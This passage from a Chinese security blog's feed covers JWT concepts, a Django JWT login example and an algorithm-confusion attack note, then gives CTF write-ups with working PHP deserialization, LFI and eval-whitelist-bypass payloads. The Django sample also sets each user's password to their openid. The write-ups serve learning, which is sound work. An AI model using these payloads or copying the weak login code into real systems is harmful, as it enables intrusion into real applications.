JWT，可以降低服务器查询数据库的次数。</p><p>（4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。</p><p>（5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</p><p>（6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</p><h2 id="内容说明"><a href="#内容说明" class="headerlink" title="内容说明"></a>内容说明</h2><p>以上主要内容转载于<a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">廖雪峰的网络日志</a></p><h1 id="实例：使用Django完成微信小程序的JWT登录及鉴权"><a href="#实例：使用Django完成微信小程序的JWT登录及鉴权" class="headerlink" title="实例：使用Django完成微信小程序的JWT登录及鉴权"></a>实例：使用Django完成微信小程序的JWT登录及鉴权</h1><p>网上目前已经有了一些文章来说明了，可是我在查阅的时候发现大多讲得不是很清楚。</p><h2 id="基本了解"><a href="#基本了解" class="headerlink" title="基本了解"></a>基本了解</h2><p>通过之前的内容铺垫，相信读者对于JWT都有了一定的了解，总的来说，便是JWT是保存在用户端的Token机制。  </p><p>需要注意的是：JWT默认是无加密的，只是使用了一层Base64编码，所以我们不能将重要信息，如密码等放入header和payload字段中。  </p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>对于Django来说，这里我们使用djangorestframework-jwt库  </p><p>安装命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install djangorestframework-jwt</span><br></pre></td></tr></table></figure><br>注意djangorestframework-jwt库默认将settings里的<code>SECRET_KEY</code>当中jwt加密秘钥。</p><p>首先我们先去我们的project下的settings文件内设置jwt库的一些参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line"></span><br><span class="line"># 在末尾添加上</span><br><span class="line">REST_FRAMEWORK &#x3D; &#123;</span><br><span class="line">&#39;DEFAULT_AUTHENTICATION_CLASSES&#39;: (</span><br><span class="line">        &#39;rest_framework_jwt.authentication.JSONWebTokenAuthentication&#39;,# JWT认证，在前面的认证方案优先</span><br><span class="line">        &#39;rest_framework.authentication.SessionAuthentication&#39;,</span><br><span class="line">        &#39;rest_framework.authentication.BasicAuthentication&#39;,</span><br><span class="line">    ),</span><br><span class="line">&#125;</span><br><span class="line">JWT_AUTH &#x3D; &#123;</span><br><span class="line">    &#39;JWT_EXPIRATION_DELTA&#39;: datetime.timedelta(days&#x3D;1), #JWT_EXPIRATION_DELTA 指明token的有效期</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>登录函数的实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">登录函数：</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">def get_user_info_func(user_code):</span><br><span class="line">    api_url &#x3D; &#39;https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;sns&#x2F;jscode2session?appid&#x3D;&#123;0&#125;&amp;secret&#x3D;&#123;1&#125;&amp;js_code&#x3D;&#123;2&#125;&amp;grant_type&#x3D;authorization_code&#39;</span><br><span class="line">    get_url &#x3D; api_url.format(App_id,App_secret,user_code)</span><br><span class="line">    r &#x3D; requests.get(get_url)</span><br><span class="line">    return r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@require_http_methods([&#39;POST&#39;])</span><br><span class="line">def user_login_func(request):</span><br><span class="line">    try:</span><br><span class="line">        user_code &#x3D; request.POST.get(&#39;user_code&#39;)</span><br><span class="line">        print(user_code)</span><br><span class="line">        if user_code &#x3D;&#x3D; None:</span><br><span class="line">            print(request.body)</span><br><span class="line">            json_data &#x3D;  json.loads(request.body)</span><br><span class="line">            user_code &#x3D; json_data[&#39;user_code&#39;]</span><br><span class="line">            print(user_code)</span><br><span class="line">    except:</span><br><span class="line">        return JsonResponse(&#123;&#39;status&#39;:500,&#39;error&#39;:&#39;请输入完整数据&#39;&#125;)</span><br><span class="line">    try:</span><br><span class="line">        json_data &#x3D; get_user_info_func(user_code)</span><br><span class="line">        #json_data &#x3D; &#123;&#39;errcode&#39;:0,&#39;openid&#39;:&#39;111&#39;,&#39;session_key&#39;:&#39;test&#39;&#125;</span><br><span class="line">        if &#39;errcode&#39; in json_data:</span><br><span class="line">            return JsonResponse(&#123;&#39;status&#39;: 500, &#39;error&#39;: &#39;验证错误：&#39; + json_data[&#39;errmsg&#39;]&#125;)</span><br><span class="line">        res &#x3D; login_or_create_account(json_data)</span><br><span class="line">        return JsonResponse(res)</span><br><span class="line">    except:</span><br><span class="line">        return JsonResponse(&#123;&#39;status&#39;:500,&#39;error&#39;:&#39;无法与微信验证端连接&#39;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login_or_create_account(json_data):</span><br><span class="line">    openid &#x3D; json_data[&#39;openid&#39;]</span><br><span class="line">    session_key &#x3D; json_data[&#39;session_key&#39;]</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        user &#x3D; User.objects.get(username&#x3D;openid)</span><br><span class="line">    except:</span><br><span class="line">        user &#x3D; User.objects.create(</span><br><span class="line">            username&#x3D;openid,</span><br><span class="line">            password&#x3D;openid,</span><br><span class="line">        )</span><br><span class="line">    user.session_key &#x3D; session_key</span><br><span class="line">    user.save()</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        jwt_payload_handler &#x3D; api_settings.JWT_PAYLOAD_HANDLER</span><br><span class="line">        jwt_encode_handler &#x3D; api_settings.JWT_ENCODE_HANDLER</span><br><span class="line">        payload &#x3D; jwt_payload_handler(user)</span><br><span class="line">        token &#x3D; jwt_encode_handler(payload)</span><br><span class="line">        res &#x3D; &#123;</span><br><span class="line">            &#39;status&#39;: 200,</span><br><span class="line">            &#39;token&#39;: token</span><br><span class="line">        &#125;</span><br><span class="line">    except:</span><br><span class="line">        res &#x3D; &#123;</span><br><span class="line">            &#39;status&#39;: 500,</span><br><span class="line">            &#39;error&#39;: &#39;jwt验证失败&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    return res</span><br></pre></td></tr></table></figure><br>视图函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">视图样例：</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">from django.http import JsonResponse</span><br><span class="line">from account.models import *</span><br><span class="line">from rest_framework_jwt.views import APIView</span><br><span class="line">from rest_framework import authentication</span><br><span class="line">from rest_framework.permissions import IsAuthenticated</span><br><span class="line">from rest_framework_jwt.authentication import JSONWebTokenAuthentication</span><br><span class="line">from rest_framework import permissions</span><br><span class="line"></span><br><span class="line">class IsOwnerOrReadOnly(permissions.BasePermission):</span><br><span class="line"></span><br><span class="line">    def has_object_permission(self, request, view, obj):</span><br><span class="line">        if request.method in [&#39;GET&#39;,&#39;POST&#39;]:</span><br><span class="line">            return True</span><br><span class="line">        return obj.user &#x3D;&#x3D; request.user</span><br><span class="line"></span><br><span class="line">class test_view(APIView):</span><br><span class="line">    http_method_names &#x3D; [&#39;post&#39;]  #限制api的访问方式</span><br><span class="line">    authentication_classes &#x3D; (authentication.SessionAuthentication,JSONWebTokenAuthentication)</span><br><span class="line">    permission_classes &#x3D; (IsAuthenticated,IsOwnerOrReadOnly)       #权限管理</span><br><span class="line"></span><br><span class="line">    def post(self,request):                                        #视图函数</span><br><span class="line">        user &#x3D; request.user.username</span><br><span class="line">        U &#x3D; User.objects.get(username&#x3D;user)</span><br><span class="line">        json_data &#x3D; json.loads(request.body)</span><br><span class="line">        try:</span><br><span class="line">            test &#x3D; json_data[&#39;&#39;]</span><br><span class="line">        except:</span><br><span class="line">            return JsonResponse(&#123;&#39;status&#39;:500,&#39;errmsg&#39;:&#39;参数不全&#39;&#125;)</span><br><span class="line">        try:</span><br><span class="line">            U.sex &#x3D; sex</span><br><span class="line">            U.weight &#x3D; weight</span><br><span class="line">            U.height &#x3D; height</span><br><span class="line">            U.save()</span><br><span class="line">        except:</span><br><span class="line">            return JsonResponse(&#123;&#39;status&#39;: 500, &#39;errmsg&#39;: &#39;数据库错误&#39;&#125;)</span><br><span class="line">        return JsonResponse(&#123;&#39;status&#39;:200&#125;)</span><br></pre></td></tr></table></figure><br>urls.py:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    re_path(&#39;^$&#39;, index),</span><br><span class="line">    re_path(&#39;^login$&#39;,login),                                 # 登录</span><br><span class="line">    re_path(&#39;^test$&#39;,test_view.as_view())</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h1 id="从一道CTF引发的对JWT安全的简单思考"><a href="#从一道CTF引发的对JWT安全的简单思考" class="headerlink" title="从一道CTF引发的对JWT安全的简单思考"></a>从一道CTF引发的对JWT安全的简单思考</h1><h2 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h2><p>题目：2019ISCC Web6</p><p>解题关键：</p><p>改题的加密方式为：RS256，是一种非对称加密，分有公钥和私钥。</p><p>其中：</p><ul><li>私钥加密</li><li>公钥解密</li></ul><p>当公钥泄露时，将JWT中的Header部分算法改为对称加密，攻击者本地使用泄露的公司进行Token伪造，将获取到的Token发送给验证端时，会使用公钥按照Header中的算法进行解密，而在原来的Header中算法为RS256，需要私钥加密生成Token，可是当我们修改为对称加密的HS256时，我们便可以成功伪造Token，且服务端也可以正常验证。</p><p>产生这一问题的主要原因便是，HWT的Header段是可控制的，通常只经过一层base64编码处理，也就是说解密算法可有用户控制。</p><p>防御：保护公钥不泄露，将Header段经RSA等方法加密。</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul><li>密钥可控</li><li>密钥爆破</li></ul><p>特殊情况，不做深入，感兴趣的可见<a href="https://www.anquanke.com/post/id/145540#h3-9" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540#h3-9</a></p>]]></content>
    
    <summary type="html">
    
      最近在编写微信小程序后端的时候遇到这个问题，这里简单记录一下。
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="Django" scheme="https://www.0x002.com/tags/Django/"/>
    
      <category term="JWT" scheme="https://www.0x002.com/tags/JWT/"/>
    
      <category term="微信小程序" scheme="https://www.0x002.com/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>2019全国大学生信息安全大赛两道web</title>
    <link href="https://www.0x002.com/2019/2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E8%B5%9B%E4%B8%A4%E9%A2%98WEB%E9%A2%98%E8%A7%A3/"/>
    <id>https://www.0x002.com/2019/2019全国大学生信安赛两题WEB题解/</id>
    <published>2019-04-20T06:00:00.000Z</published>
    <updated>2019-06-17T16:20:10.564Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简单小结"><a href="#简单小结" class="headerlink" title="简单小结"></a>简单小结</h2><p>菜鸟第一次打国赛，这次题目质量很高，学到了许多姿势。<br><a id="more"></a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Justsoso"><a href="#Justsoso" class="headerlink" title="Justsoso"></a>Justsoso</h3><p>打开题目，源代码出存在提示：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://0d077ef9e74d8.cdn.sohucs.com/romWP63_png"><br>使用LFI读取index.php与hint.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d4dc224926cd47bca560b0ec2f84bad155efe5b747574b89.changame.ichunqiu.com&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;d4dc224926cd47bca560b0ec2f84bad155efe5b747574b89.changame.ichunqiu.com&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br></pre></td></tr></table></figure><br>得如下源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line">$payload &#x3D; $_GET[&quot;payload&quot;];</span><br><span class="line">if(!isset($file))&#123;</span><br><span class="line">echo &#39;Missing parameter&#39;.&#39;&lt;br&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">die(&#39;hack attacked!!!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">if(isset($payload))&#123;  </span><br><span class="line">    $url &#x3D; parse_url($_SERVER[&#39;REQUEST_URI&#39;]);</span><br><span class="line">    parse_str($url[&#39;query&#39;],$query);</span><br><span class="line">    foreach($query as $value)&#123;</span><br><span class="line">        if (preg_match(&quot;&#x2F;flag&#x2F;&quot;,$value)) &#123; </span><br><span class="line">        die(&#39;stop hacking!&#39;);</span><br><span class="line">        exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload &#x3D; unserialize($payload);</span><br><span class="line">&#125;else&#123; </span><br><span class="line">   echo &quot;Missing parameters&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line">&lt;!--Please test index.php?file&#x3D;xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">class Handle&#123; </span><br><span class="line">    private $handle;  </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">foreach(get_object_vars($this) as $k &#x3D;&gt; $v) &#123;</span><br><span class="line">            $this-&gt;$k &#x3D; null;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;Waking up\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">public function __construct($handle) &#123; </span><br><span class="line">        $this-&gt;handle &#x3D; $handle; </span><br><span class="line">    &#125; </span><br><span class="line">public function __destruct()&#123;</span><br><span class="line">$this-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $token;</span><br><span class="line">    public $token_flag;</span><br><span class="line"> </span><br><span class="line">    function __construct($file)&#123;</span><br><span class="line">$this-&gt;file &#x3D; $file;</span><br><span class="line">$this-&gt;token_flag &#x3D; $this-&gt;token &#x3D; md5(rand(1,10000));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">public function getFlag()&#123;</span><br><span class="line">$this-&gt;token_flag &#x3D; md5(rand(1,10000));</span><br><span class="line">        if($this-&gt;token &#x3D;&#x3D;&#x3D; $this-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line">if(isset($this-&gt;file))&#123;</span><br><span class="line">echo @highlight_file($this-&gt;file,true); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>很容易可以知道此题考的是php反序列化，通过file引入<code>hint.php</code>到<code>index.php</code>，操作payload反序列化执行类中的<code>getflag()</code>函数<br>此题有两个难点：<br>正则Flag判断绕过与随机数md5判断的绕过<br>前者可通过使用 <code>///</code>绕过<code>parse_url()</code>函数，此时该函数获取到的内容为空，而后者可以使用指针来将<code>token_flag</code>指向<code>token</code>，来使两者恒等。</p><p>添加以下代码在本地生成序列化字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; new Flag(‘flag.php’);</span><br><span class="line">$a-&gt;token_flag &#x3D; &amp;$a-&gt;token;</span><br><span class="line">$b &#x3D; new Handle($a);</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure><br>输出的结果为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A6%3A%22Handle%22%3A1%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22bc573864331a9e42e4511de6f678aa83%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D</span><br></pre></td></tr></table></figure></p><p>注意里边有不可见字符<code>%00</code>，且需要将<code>Handle</code>的对象数量改成2+，这样才可以进入<code>__destruct</code>函数。<br>故最终payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F;index.php?file&#x3D;hint.php&amp;payload&#x3D;O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;bc573864331a9e42e4511de6f678aa83&quot;;s:10:&quot;token_flag&quot;;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://0d077ef9e74d8.cdn.sohucs.com/romXAJs_png">  </p><h3 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h3><p>打开题目，发现在js地址出使用ajax向calc.php发送数据<br>使用浏览器访问之，得源码<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://0d077ef9e74d8.cdn.sohucs.com/ron0lAK_png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag </span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1 </span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;]; </span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123; </span><br><span class="line">        die(&quot;太长了不会算&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;]; </span><br><span class="line">    foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp </span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs); </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123; </span><br><span class="line">        if (!in_array($func, $whitelist)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    &#x2F;&#x2F;帮你算出答案 </span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到过滤了一些常用字符和基于白名单的过滤，<br>限制得比较死，故此处我们只能使用白名单内的函数来进行命令执行，且不能有黑名单内的字符。  </p><p>我们注意到，白名单里边的<code>base_convert、dechex、decbin</code>等用于进制转换的函数，我们可以使用其来绕过基于白名单的检测。比如：<code>phpinfo</code>可以将<code>phpinfo</code>先转换成<code>hex</code>，在转换成十进制，这样就可以做到无字母执行函数。  </p><p>由于长度问题，我们无法直接在参数c里传过多的白名单函数+字符，所以这里我们使用其他<code>GET</code>参数传入，不直接使用参数c，即可绕过，但要注意的是此处的参数名，不能为字母，只能为数字，不然会被第二个关键词白名单所拦截。  </p><p>再由于<code>Ascii</code>转成<code>Hex</code>后转回来需要<code>hex2bin</code>函数，而白名单里并没有这个函数，所以我们需要使用进制转换进行绕过，又因为<code>hex2bin</code>里部分字母只有在<code>32进制</code>后才会出现，所以此处我们选择<code>36进制</code>。将<code>hex2bin</code>由<code>36进制</code>成无字母的<code>10进制</code>得到：<code>37907361743</code>我们使用<code>base_convert（37907361743，10,36</code>即可转换成<code>hex2bin</code>，而<code>_GET</code>的<code>hex</code>为<code>5f474554</code>，里边包含了字母f，需要在进行一次转换：f正好为16进制里的最后一个字母，可直接使用<code>dechex(1598506324)</code>即可绕过。故<code>$sin=base_convert(37907361743,10,36)(dechex(1598506324))</code>即为<code>$sin=_GET</code><br>接着我们继续构造:<br>我们知道：<code>$$sin = $_GET</code><br>那么<code>$$sin[a]()</code>即可自定义函数名，但主要此处参数不可为字母，且<code>[]</code>被过滤，故改成<code>$$sin{0}($$sin{1})`</code><br>所以payload构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?C&#x3D;$sin&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$sin&#123;0&#125;($$sin&#123;1&#125;);&amp;0&#x3D;show_source&amp;1&#x3D;flag.php</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://0d077ef9e74d8.cdn.sohucs.com/ron0lLS_png">  </p>]]></content>
    
    <summary type="html">
    
      简单记录下两道web的解题过程。
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="CTF" scheme="https://www.0x002.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>百道CTF刷题记录(一)</title>
    <link href="https://www.0x002.com/2019/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%B8%80)/"/>
    <id>https://www.0x002.com/2019/百道CTF刷题记录(一)/</id>
    <published>2019-04-09T04:00:00.000Z</published>
    <updated>2019-06-17T16:09:18.299Z</updated>
    
